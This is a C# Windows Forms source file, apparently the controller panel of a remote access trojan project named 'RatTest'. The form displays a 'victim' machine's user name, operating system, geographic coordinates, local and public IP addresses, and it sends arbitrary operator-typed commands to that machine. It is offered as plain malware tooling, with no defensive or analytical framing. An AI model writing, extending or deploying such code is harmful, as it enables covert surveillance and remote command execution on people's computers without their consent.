using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace RatTest
{
    partial class FormVictim : Form
    {
        Victim victim;


        public FormVictim(Victim v)
        {
            InitializeComponent();
            buttonLocation.Click += delegate {  };
            listView1.View = View.List;
            victim = v;

            textBox1.Text = "("+v.ID+") " + v.User;
            textBox2.Text = v.OS;
            labelLocX.Text = v.Coordinate.X+"";
            labelLocY.Text = v.Coordinate.Y +"";
            foreach (string s in v.LocalIP)
                listView1.Items.Add(s);
            textBox3.Text = v.NetIP;
            //labelID.Text = v.ID;

        }

        private void buttonSendCmd_Click(object sender, EventArgs e)
        {
            if( !String.IsNullOrEmpty(textBoxCMD.Text))
            {
                victim.Send(textBoxCMD.Text);
            }
        }
    }
}
